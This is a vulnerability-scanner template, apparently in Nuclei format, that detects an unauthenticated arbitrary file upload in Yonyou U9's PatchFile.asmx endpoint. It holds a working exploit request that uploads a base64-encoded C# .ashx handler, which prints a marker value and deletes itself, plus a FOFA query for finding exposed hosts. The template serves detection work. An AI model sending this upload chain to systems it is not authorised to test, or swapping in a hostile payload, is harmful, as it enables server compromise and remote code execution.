flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - <SaveFileResult>true</SaveFileResult>
  raw:
  - "POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/SaveFile\"\n\n<?xml\
    \ version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n  <SaveFile xmlns=\"http://tempuri.org/\">\n    <binData>PCVAIFdlYkhhbmRsZXIgTGFuZ3VhZ2U9IkMjIiBDbGFzcz0iRGVsZXRlQ3VycmVudEZpbGUiICU+DQoNCiAgICB1c2luZyBTeXN0ZW07DQogICAgdXNpbmcgU3lzdGVtLldlYjsNCiAgICB1c2luZyBTeXN0ZW0uSU87DQoNCiAgICBwdWJsaWMgY2xhc3MgRGVsZXRlQ3VycmVudEZpbGUgOiBJSHR0cEhhbmRsZXIgew0KICAgICAgICANCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QgKEh0dHBDb250ZXh0IGNvbnRleHQpIHsNCiAgICAgICAgICAgIGludCByZXN1bHQgPSAxMTExICogMjIyMjsNCiAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuQ29udGVudFR5cGUgPSAidGV4dC9wbGFpbiI7DQogICAgICAgICAgICBjb250ZXh0LlJlc3BvbnNlLldyaXRlKHJlc3VsdCk7DQoNCiAgICAgICAgICAgIHN0cmluZyBmaWxlUGF0aCA9IGNvbnRleHQuU2VydmVyLk1hcFBhdGgoY29udGV4dC5SZXF1ZXN0LkN1cnJlbnRFeGVjdXRpb25GaWxlUGF0aCk7DQogICAgICAgICAgICBpZiAoRmlsZS5FeGlzdHMoZmlsZVBhdGgpKSB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoZmlsZVBhdGgpOw0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LlJlc3BvbnNlLldyaXRlKCJcbkZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkuIik7DQogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUoIlxuRXJyb3IgZGVsZXRpbmcgZmlsZTogIiArIGV4Lk1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgY29udGV4dC5SZXNwb25zZS5Xcml0ZSgiXG5GaWxlIG5vdCBmb3VuZC4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIA0KICAgICAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIHsNCiAgICAgICAgICAgIGdldCB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0K\
    \             fQ0KICAgICAgICB9DQogICAgfQ==</binData>\n    <path>./</path>\n  \
    \  <fileName>{{filename}}</fileName>\n  </SaveFile>\n  </soap:Body>\n</soap:Envelope>\n"
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "2468642","File deleted successfully")
    type: dsl
  raw:
  - 'GET /CS/Office/AutoUpdates/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-u9-patchfile-upload
info:
  author: Co5mos,ProjectDiscoveryAI
  description: 'An arbitrary file upload vulnerability in U9 PatchFile.asmx allows
    attackers to upload files to the server.This can lead to various security issues
    including remote code execution.

    '
  metadata:
    fofa-query: "title=\"U9-\u767B\u5F55\""
    verified: true
  name: Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload
  severity: critical
  tags: unauth,file-upload,yonyou,u9,rce
variables:
  filename: '{{rand_base(5)}}.ashx'
